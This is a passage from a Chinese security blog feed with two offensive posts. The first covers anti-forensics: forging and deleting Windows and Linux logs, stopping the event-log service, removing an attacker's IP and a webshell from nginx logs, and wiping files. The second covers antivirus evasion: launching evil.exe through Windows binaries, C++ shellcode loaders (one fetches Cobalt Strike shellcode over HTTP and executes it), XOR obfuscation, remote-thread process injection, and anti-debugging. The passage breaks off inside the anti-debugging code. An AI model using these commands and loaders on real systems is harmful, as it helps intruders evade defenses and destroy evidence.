清理安全日志</span><br></pre></td></tr></table></figure><h3 id="日志伪造"><a href="#日志伪造" class="headerlink" title="日志伪造"></a>日志伪造</h3><p>可以通过eventcreate这个自带工具伪造日志或者自定义大量垃圾信息覆盖现有日志（日志最大容量20MB）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eventcreate -l system -so administrator -t warning -d &quot;this is a test&quot; -id 500</span><br></pre></td></tr></table></figure><h3 id="暂停日志记录"><a href="#暂停日志记录" class="headerlink" title="暂停日志记录"></a>暂停日志记录</h3><p>可以通过工具<a href="https://github.com/hlldz/Invoke-Phant0m%EF%BC%8C%E6%9D%A5%E4%BD%BF%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E7%BB%88%E6%AD%A2%E3%80%82%E8%BF%99%E4%B8%AA%E5%B7%A5%E5%85%B7%E4%BB%85%E6%94%AF%E6%8C%81X64">https://github.com/hlldz/Invoke-Phant0m，来使日志记录终止。这个工具仅支持X64</a></p><p>该脚本遍历事件日志服务进程（专用svchost.exe）的线程堆栈，并标识事件日志线程以杀死事件日志服务线程。因此，系统将无法收集日志。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726140507925.png" alt="image-20210726140507925"></p><p>随后新增用户，发现日志中无记录，看来日志记录确实是被终止了。</p><h3 id="单条日志清除"><a href="#单条日志清除" class="headerlink" title="单条日志清除"></a>单条日志清除</h3><p><a href="https://github.com/QAX-A-Team/EventCleaner">https://github.com/QAX-A-Team/EventCleaner</a></p><p>这个工具也可以暂停日志线程停止日志记录，同时也可以恢复日志线程。但是更重要的是它可以删除单挑日志记录</p><p>官方描述</p><ol><li>EventCleaner closehandle  解除 security.evtx的文件占坑</li><li>EventCleaner 100 删除ID为100的日志(必须在之前使用EventCleaner  closehandle)</li><li>EventCleaner suspend 暂停日志线程,停止日志记录</li><li>do anything without worrying about logs</li><li>EventCleaner normal 恢复日志线程</li><li>delete EventCleaner</li></ol><h2 id="各日志位置及手动清除"><a href="#各日志位置及手动清除" class="headerlink" title="各日志位置及手动清除"></a>各日志位置及手动清除</h2><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">路径 %SystemDrive%\inetpub\logs\LogFiles\W3SVC1\</span><br></pre></td></tr></table></figure><p>清除WWW日志(其实并不需要停止服务都能删)：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">停止服务：net stop w3svc</span><br><span class="line">删除日志目录下所有文件：del *.*</span><br><span class="line">启用服务：net start w3svc</span><br></pre></td></tr></table></figure><h3 id="应用程序日志，安全日志，系统日志"><a href="#应用程序日志，安全日志，系统日志" class="headerlink" title="应用程序日志，安全日志，系统日志"></a>应用程序日志，安全日志，系统日志</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%systemroot%\system32\config\AppEvent.EVT;</span><br><span class="line">%systemroot%\system32\config\SecEvent.EVT;</span><br><span class="line">%systemroot%\system32\config\SysEvent.EVT;</span><br></pre></td></tr></table></figure><h3 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%systemroot%\system32\logfiles\msftpsvc1\</span><br></pre></td></tr></table></figure><h3 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h3><p>直接嫖脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; &#x2F;va &#x2F;f # 删除Default中的所有值</span><br><span class="line">reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; &#x2F;f # 删除整个Servers</span><br><span class="line">reg add &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; 重新创建删除的注册表项</span><br><span class="line">cd %userprofile%\documents\ # 转到Default.rdp文件目录</span><br><span class="line">attrib Default.rdp -s -h # 更改Default.rdp文件属性，默认情况下它是隐藏</span><br><span class="line">del Default.rdp  # 删除文件Default.rdp文件</span><br></pre></td></tr></table></figure><h2 id="彻底删除日志"><a href="#彻底删除日志" class="headerlink" title="彻底删除日志"></a>彻底删除日志</h2><p>如何彻底删除日志？要知道仅仅是普通的删除命令实际上是并不能做到完全删除的，很容易被找到删除文件。</p><h3 id="Cipher-命令多次覆写"><a href="#Cipher-命令多次覆写" class="headerlink" title="Cipher 命令多次覆写"></a>Cipher 命令多次覆写</h3><p>在删除文件后，可以利用Cipher 命令通过 /W 参数可反复写入其他数据覆盖已删除文件的硬盘空间，彻底删除数据防止被恢复。比如</p><p>刚刚删除<code>D:\tools</code>目录下的文件，执行<code>cipher /w:D:\tools</code>，D 盘上未使用空间就会被覆盖三次：一次 0x00、一次 0xFF，一次随机数，所有被删除的文件就都不可能被恢复了。</p><h3 id="Format命令覆盖格式化"><a href="#Format命令覆盖格式化" class="headerlink" title="Format命令覆盖格式化"></a><strong>Format命令覆盖格式化</strong></h3><p>Format 命令加上 /P 参数后，就会把每个扇区先清零，再用随机数覆盖。而且可以覆盖多次。比如</p><p><code>format D: /P:8</code>就表示把 D 盘用随机数覆盖 8 次。</p><h1 id="LINUX-日志"><a href="#LINUX-日志" class="headerlink" title="LINUX 日志"></a>LINUX 日志</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/log/message 系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一</span><br><span class="line">/<span class="keyword">var</span>/log/secure 与安全相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/log/maillog 与邮件相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/log/cron 与定时任务相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/log/spooler 与UUCP和news设备相关的日志信息</span><br><span class="line">/<span class="keyword">var</span>/log/boot.log 守护进程启动和停止相关的日志消息</span><br><span class="line">/<span class="keyword">var</span>/log/wtmp 该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件,用last查看</span><br><span class="line">/<span class="keyword">var</span>/log/btmp   记录所有登录失败信息，使用lastb命令查看</span><br><span class="line">/<span class="keyword">var</span>/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看</span><br><span class="line">/<span class="keyword">var</span>/log/utmp    记录当前已经登录的用户信息，使用w,who,users等命令查看</span><br><span class="line">~/.bash_history 执行的命令,用 histroy -c 即可删除</span><br></pre></td></tr></table></figure><h2 id="清空日志-1"><a href="#清空日志-1" class="headerlink" title="清空日志"></a>清空日志</h2><p>清除用户最后一次登录时间：echo &gt; /var/log/lastlog          #lastlog命令<br>清除当前登录用户的信息：echo &gt;   /var/log/utmp             #使用w,who,users等命令<br>清除安全日志记录：cat /dev/null &gt;  /var/log/secure<br>清除系统日志记录：cat /dev/null &gt;  /var/log/message</p><p>诸如此类…</p><h2 id="替换-删除部分日志"><a href="#替换-删除部分日志" class="headerlink" title="替换/删除部分日志"></a>替换/删除部分日志</h2><p>日志文件被清空会引起管理员警觉，所以可以只替换或删除关键信息，实现隐秘攻击的目的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</span><br><span class="line">sed  -i &#39;&#x2F;自己的ip&#x2F;&#39;d  &#x2F;var&#x2F;log&#x2F;messages</span><br><span class="line"></span><br><span class="line"># 全局替换登录IP地址：</span><br><span class="line">sed -i &#39;s&#x2F;192.168.166.85&#x2F;192.168.1.1&#x2F;g&#39; secure</span><br><span class="line"></span><br><span class="line">对于WEB服务还可以这样隐藏我们的马</span><br><span class="line"># 使用grep -v来把我们的相关信息删除,</span><br><span class="line">cat &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log | grep -v evil.php &gt; tmp.log</span><br><span class="line"></span><br><span class="line"># 把修改过的日志覆盖到原日志文件</span><br><span class="line">cat tmp.log &gt; &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#x2F;</span><br></pre></td></tr></table></figure><h2 id="彻底删除"><a href="#彻底删除" class="headerlink" title="彻底删除"></a>彻底删除</h2><h3 id="shred"><a href="#shred" class="headerlink" title="shred"></a>shred</h3><p>-n 指定覆写次数，默认3次</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shred -f -u -z -v -n 8 1.txt </span><br></pre></td></tr></table></figure><h3 id="dd"><a href="#dd" class="headerlink" title="dd"></a>dd</h3><p>这个命令用于清空文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;要删除的文件</span><br></pre></td></tr></table></figure><h3 id="wipe"><a href="#wipe" class="headerlink" title="wipe"></a>wipe</h3><p>很简单易用，但是一般不是装机自带</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wipe filename</span><br></pre></td></tr></table></figure><h3 id="Secure-Delete"><a href="#Secure-Delete" class="headerlink" title="Secure-Delete"></a><strong>Secure-Delete</strong></h3><p>secure-delete是一个集成化工具包，收录了些安全删除文件的命令行工具。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">srm filename</span><br><span class="line">sfill &#x2F;a   用随机数填充空闲或者可用的空间，保证没有可恢复的文件或文件夹</span><br></pre></td></tr></table></figure><p>sswap用于安全地清除交换分区。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;swaps 找到交换分区</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726184935968.png" alt="image-20210726184935968"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sswap &#x2F;www&#x2F;swap</span><br></pre></td></tr></table></figure><p>smem用于清理在内存中的内容，提供安全地内存清理:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smem</span><br></pre></td></tr></table></figure><h2 id="SSH隐身登录"><a href="#SSH隐身登录" class="headerlink" title="SSH隐身登录"></a>SSH隐身登录</h2><p>ssh -T <a href="mailto:&#x72;&#111;&#111;&#116;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x31;&#57;&#57;&#46;&#x31;&#50;&#x33;">&#x72;&#111;&#111;&#116;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x31;&#57;&#57;&#46;&#x31;&#50;&#x33;</a> /usr/bin/bash -i</p><p>-T表示不分配伪终端，/usr/bin/bash -i 表示在登录后调用bash命令 -i 表示是交互式shel，这样登陆将不会在w/last命令结果中显示.</p><p>但是会被lsof -i:22 和 ps |grep ssh 等命令发现</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210726190433565.png" alt="image-20210726190433565"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WINDOWS-日志&quot;&gt;&lt;a href=&quot;#WINDOWS-日志&quot; class=&quot;headerlink&quot; title=&quot;WINDOWS 日志&quot;&gt;&lt;/a&gt;WINDOWS 日志&lt;/h1&gt;&lt;p&gt;Windows日志有许多细分类：&lt;br&gt;windows事件日志，IIS日志，</summary>
      
    
    
    
    
    <category term="系统相关与免杀" scheme="http://const27.com/tags/%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%E4%B8%8E%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>基础免杀手法暴风吸入</title>
    <link href="http://const27.com/2021/09/03/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/"/>
    <id>http://const27.com/2021/09/03/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/</id>
    <published>2021-09-03T13:08:31.882Z</published>
    <updated>2021-09-03T13:18:40.381Z</updated>
    
    <content type="html"><![CDATA[<p>前面的话:”免杀一般都是靠组合拳”</p><h1 id="EXE"><a href="#EXE" class="headerlink" title="EXE"></a>EXE</h1><h3 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h3><p>没什么好说的。可以自写加壳器等等</p><h3 id="添加数字签名"><a href="#添加数字签名" class="headerlink" title="添加数字签名"></a>添加数字签名</h3><p>不同的杀软对数字签名的敏感性不同，有些杀软可能只检查一下有没有数字签名就过了，有些杀软可能要去验证一下数字签名的正确性，有些可能管都不管数字签名。只能说添加数字签名能稍微提升一下exe的免杀几率。</p><h3 id="间接运行exe"><a href="#间接运行exe" class="headerlink" title="间接运行exe"></a>间接运行exe</h3><p>平时我们运行一个exe： cmd /c c:\a.exe  但这样容易被杀或者命令被ban。所有就有一些间接运行exe的方法</p><h4 id="forfiles"><a href="#forfiles" class="headerlink" title="forfiles"></a>forfiles</h4><p>forfiles是一个用于批处理的一个工具，它在找到文件后会执行指定的命令. </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">forfiles &#x2F;p 指定搜索文件的目录 &#x2F;m 指定搜索关键词 &#x2F;c 指定要执行的命令</span><br><span class="line">forfiles &#x2F;p c:\windows\system32 &#x2F;m calc.exe &#x2F;c c:\tmp\evil.exe  &#x2F;&#x2F;evil.exe会成为forfiles.exe的子进程</span><br></pre></td></tr></table></figure><h4 id="pcalua"><a href="#pcalua" class="headerlink" title="pcalua"></a>pcalua</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pcalua -a c:\tmp\evil.exe  &#x2F;&#x2F;evil.exe不会成为子进程</span><br></pre></td></tr></table></figure><h4 id="cmd-Hijack"><a href="#cmd-Hijack" class="headerlink" title="cmd Hijack"></a>cmd Hijack</h4><p>下面命令将弹计算器</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd.exe &#x2F;c &quot;ping 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe&quot;</span><br><span class="line"></span><br><span class="line">cmd.exe &#x2F;c &quot;ping ;a.exe; 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe&quot;</span><br><span class="line"></span><br><span class="line">ping ;a.exe 127.0.0.1&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe</span><br></pre></td></tr></table></figure><h4 id="conhost"><a href="#conhost" class="headerlink" title="conhost"></a>conhost</h4><p>大于win7可用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conhost c:\windows\system32\calc.exe</span><br><span class="line">conhost adsadas&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;calc.exe</span><br><span class="line"></span><br><span class="line">以下指令win10某些版本无法使用</span><br><span class="line">conhost &quot;asddas c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure><h4 id="explorer-exe"><a href="#explorer-exe" class="headerlink" title="explorer.exe"></a>explorer.exe</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">explorer.exe c:\windows\system32\calc.exe</span><br><span class="line">explorer asdsadasd,&quot;c:\windows\system32\calc.exe&quot;</span><br></pre></td></tr></table></figure><h1 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h1><h3 id="shellcode处理"><a href="#shellcode处理" class="headerlink" title="shellcode处理"></a>shellcode处理</h3><h4 id="指针执行-申请内存动态加载shellcode"><a href="#指针执行-申请内存动态加载shellcode" class="headerlink" title="指针执行+申请内存动态加载shellcode"></a>指针执行+申请内存动态加载shellcode</h4><p>首先从cobalt strike上生成拿到shellcode用作本次测试。<br>然后通过下面的代码，直接执行写死在程序里的shellcode。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">    void* exec &#x3D; VirtualAlloc(0, sizeof buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    memcpy(exec, buf, sizeof buf);</span><br><span class="line">    ((void(*)())exec)();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145713.png" alt="QQ截图20210217145713"></p><p>可以看见，还是很拉跨的。</p><h4 id="内联汇编加载shellcode"><a href="#内联汇编加载shellcode" class="headerlink" title="内联汇编加载shellcode"></a>内联汇编加载shellcode</h4><p>c++有强大的内联汇编功能，上次写壳的时候就感受了一番。<br>我们可以通过内联汇编代码加载shellcode.顺便加花什么的，都可以弄。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;winhttp.h&gt;</span><br><span class="line">#pragma comment(lib, &quot;winhttp.lib&quot;)</span><br><span class="line">#pragma comment(lib,&quot;user32.lib&quot;)</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">_asm &#123;</span><br><span class="line">lea eax, buf;</span><br><span class="line">jmp eax;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145723.png" alt="QQ截图20210217145723"></p><p>还是蛮拉跨的，虽然我没有加花。</p><h4 id="HTTP协议远程读取shellcode"><a href="#HTTP协议远程读取shellcode" class="headerlink" title="HTTP协议远程读取shellcode"></a>HTTP协议远程读取shellcode</h4><p>这次我们不把shellcode写死在程序之中，而是通过程序发起http请求向外界获得shellcode并执行。<br>这里涉及到winhttp.h的一些函数的使用。</p><p>源码借用一下 卿 的代码。它的代码是直接把shellcode的十六进制以字符串形式直接放到远程服务器上。像这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145737.png" alt="QQ截图20210217145737"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;string&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;winhttp.h&gt;</span><br><span class="line">#pragma comment(lib,&quot;winhttp.lib&quot;)</span><br><span class="line">#pragma comment(lib,&quot;user32.lib&quot;)</span><br><span class="line">using namespace std;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwSize &#x3D; 0;</span><br><span class="line">    DWORD dwDownloaded &#x3D; 0;</span><br><span class="line">    LPSTR pszOutBuffer &#x3D; NULL;</span><br><span class="line">    HINTERNET  hSession &#x3D; NULL,</span><br><span class="line">        hConnect &#x3D; NULL,</span><br><span class="line">        hRequest &#x3D; NULL;</span><br><span class="line">    BOOL  bResults &#x3D; FALSE;</span><br><span class="line">    hSession &#x3D; WinHttpOpen(L&quot;User-Agent&quot;, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);</span><br><span class="line">    if (hSession)</span><br><span class="line">    &#123;</span><br><span class="line">        hConnect &#x3D; WinHttpConnect(hSession, L&quot;127.0.0.1&quot;, INTERNET_DEFAULT_HTTP_PORT, 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (hConnect)</span><br><span class="line">    &#123;</span><br><span class="line">        hRequest &#x3D; WinHttpOpenRequest(hConnect, L&quot;POST&quot;, L&quot;qing.txt&quot;, L&quot;HTTP&#x2F;1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);</span><br><span class="line">    &#125;</span><br><span class="line">    LPCWSTR header &#x3D; L&quot;Content-type: application&#x2F;x-www-form-urlencoded&#x2F;r&#x2F;n&quot;;</span><br><span class="line">    SIZE_T len &#x3D; lstrlenW(header);</span><br><span class="line">    WinHttpAddRequestHeaders(hRequest, header, DWORD(len), WINHTTP_ADDREQ_FLAG_ADD);</span><br><span class="line">    if (hRequest)</span><br><span class="line">    &#123;</span><br><span class="line">        std::string data &#x3D; &quot;name&#x3D;host&amp;sign&#x3D;xx11sad&quot;;</span><br><span class="line">        const void *ss &#x3D; (const char *)data.c_str();</span><br><span class="line">        bResults &#x3D; WinHttpSendRequest(hRequest, 0, 0, const_cast&lt;void *&gt;(ss), data.length(), data.length(), 0);</span><br><span class="line">        &#x2F;&#x2F;&#x2F;&#x2F;bResults&#x3D;WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS, 0,WINHTTP_NO_REQUEST_DATA, 0, 0, 0 );</span><br><span class="line">    &#125;</span><br><span class="line">    if (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        bResults &#x3D; WinHttpReceiveResponse(hRequest, NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    if (bResults)</span><br><span class="line">    &#123;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; Check for available data.</span><br><span class="line">            dwSize &#x3D; 0;</span><br><span class="line">            if (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;Error %u in WinHttpQueryDataAvailable.\n&quot;, GetLastError());</span><br><span class="line"></span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (!dwSize)</span><br><span class="line">                break;</span><br><span class="line"></span><br><span class="line">            pszOutBuffer &#x3D; new char[dwSize + 1];</span><br><span class="line"></span><br><span class="line">            if (!pszOutBuffer)</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;Out of memory\n&quot;);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ZeroMemory(pszOutBuffer, dwSize + 1);</span><br><span class="line"></span><br><span class="line">            if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &amp;dwDownloaded))</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;Error %u in WinHttpReadData.\n&quot;, GetLastError());</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                printf(&quot;ok&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F;char ShellCode[1024];</span><br><span class="line">            int code_length &#x3D; strlen(pszOutBuffer);</span><br><span class="line">            char* ShellCode &#x3D; (char*)calloc(code_length  &#x2F;2 , sizeof(unsigned char));</span><br><span class="line"></span><br><span class="line">            for (size_t count &#x3D; 0; count &lt; code_length &#x2F; 2; count++)&#123;</span><br><span class="line">                sscanf(pszOutBuffer, &quot;%2hhx&quot;, &amp;ShellCode[count]);</span><br><span class="line">                pszOutBuffer +&#x3D; 2;</span><br><span class="line">            &#125;</span><br><span class="line">            printf(&quot;%s&quot;, ShellCode);</span><br><span class="line">            &#x2F;&#x2F;strcpy(ShellCode,pszOutBuffer);</span><br><span class="line">            void *exec &#x3D; VirtualAlloc(0, sizeof ShellCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            memcpy(exec, ShellCode, sizeof ShellCode);</span><br><span class="line">            ((void(*)())exec)();</span><br><span class="line">            delete[] pszOutBuffer;</span><br><span class="line">            if (!dwDownloaded)</span><br><span class="line">                break;</span><br><span class="line">        &#125; while (dwSize &gt; 0);</span><br><span class="line">    &#125;</span><br><span class="line">    if (hRequest) WinHttpCloseHandle(hRequest);</span><br><span class="line">    if (hConnect) WinHttpCloseHandle(hConnect);</span><br><span class="line">    if (hSession) WinHttpCloseHandle(hSession);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致流程便是:</p><p>1.通过winhttp中的函数，以HTTP的方法获取远程服务器上的shellcode（此时shellcode在内存中是按照编码结果存储的，如下图，左边是内存原文，右边是内存解码（shellcode））</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145818.png" alt="QQ截图20210217145818"></p><p>2.开辟一段内存，然后通过sscanf等方法读取存储shellcode变量的内容，将内存解码信息录入新的内存空间,使shellcode存在于内存中<br>3.执行shellcode，可以用指针执行等方法执行。</p><h4 id="使用加载器加载shellcode"><a href="#使用加载器加载shellcode" class="headerlink" title="使用加载器加载shellcode"></a>使用加载器加载shellcode</h4><h5 id="shellcode-launcher-加载器"><a href="#shellcode-launcher-加载器" class="headerlink" title="shellcode_ launcher 加载器"></a>shellcode_ launcher 加载器</h5><p><a href="https://github.com/clinicallyinane/shellcode_launcher/">https://github.com/clinicallyinane/shellcode_launcher/</a></p><p>用msf或者cs生成raw形式shellcode，然后使用这个加载器加载一下就行了.<br>像这样 shellcode_launcher.exe -i C:\payload32.bin<br>shellcode_ launcher 在virustotal上报毒率也是很高很高了…</p><h5 id="SSI-加载器"><a href="#SSI-加载器" class="headerlink" title="SSI 加载器"></a>SSI 加载器</h5><p><a href="https://github.com/DimopoulosElias/SimpleShellcodeInjector">https://github.com/DimopoulosElias/SimpleShellcodeInjector</a></p><p> cs生成c形式shellcode，然后去除\x，再拿给ssi加载器加载,像这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145832.png" alt="QQ截图20210217145832"></p><p>ssi.exe shellcode 即可完成加载</p><p>ssi在virustotal上报毒率也是非常高..</p><h5 id="自写加载器"><a href="#自写加载器" class="headerlink" title="自写加载器"></a>自写加载器</h5><p>ssi源码很简单大家可以参考写一下</p><h4 id="shellcode变形"><a href="#shellcode变形" class="headerlink" title="shellcode变形"></a>shellcode变形</h4><p>大思路就是把shellcode混淆后，放入加载器加载运行。<br>其细分思路就包括怎么把shellcode进行混淆了，简单的有XOR,BASE64，复杂一点的有AES等。<br>这里就只说说xor。<br>首先我们得准备一个程序将shellcode进行混淆。图方便就拿python写也是蛮不错的。<br>随便写了一个。效果真不戳（虽然上传了vt过两天就肯定不能用了)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145855.png" alt="QQ截图20210217145855"></p><p>github:<a href="https://github.com/ConsT27/SimpleXORshellcode">https://github.com/ConsT27/SimpleXORshellcode</a></p><h4 id="shellcode注入进程内存"><a href="#shellcode注入进程内存" class="headerlink" title="shellcode注入进程内存"></a>shellcode注入进程内存</h4><h5 id="注入已有进程"><a href="#注入已有进程" class="headerlink" title="注入已有进程"></a>注入已有进程</h5><p>大致逻辑:OpenProcess获得进程句柄-&gt;VirtualAllocEx在进程中开辟一段内存空间-&gt;WriteProcessMemory向刚刚开辟的内存空间中写入shellcode-&gt;CreateRemoteThread为刚刚写入的shellcode创建一个线程执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line">DWORD pid &#x3D; 25388;</span><br><span class="line">HANDLE Proc &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">if (!Proc) &#123;</span><br><span class="line">std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">LPVOID buffer &#x3D; VirtualAllocEx(Proc, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">if (buffer) &#123;</span><br><span class="line">std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">if (WriteProcessMemory(Proc, buffer, buf, sizeof(buf), 0) )&#123;</span><br><span class="line">std::cout &lt;&lt; GetLastError() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">HANDLE remotethread &#x3D; CreateRemoteThread(Proc, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果:虽然也很拉，但是静态过了趋势是我没想到的。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145906.png" alt="QQ截图20210217145906"></p><h3 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h3><p>可以通过反调试来规避杀软检测，拖慢逆向工程师分析速度，但也有可能提高被判为恶意文件的概率。</p><h5 id="直接判断是否为调试状态"><a href="#直接判断是否为调试状态" class="headerlink" title="直接判断是否为调试状态"></a>直接判断是否为调试状态</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (IsDebuggerPresent()) return FALSE;</span><br><span class="line"></span><br><span class="line">PPEB pPEB &#x3D; (PPEB)__readgsqword(0x60);</span><br><span class="line">if (pPEB-&gt;BeingDebugged) return;</span><br><span class="line"></span><br><span class="line">BOOL ret;  </span><br><span class="line">CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;ret);  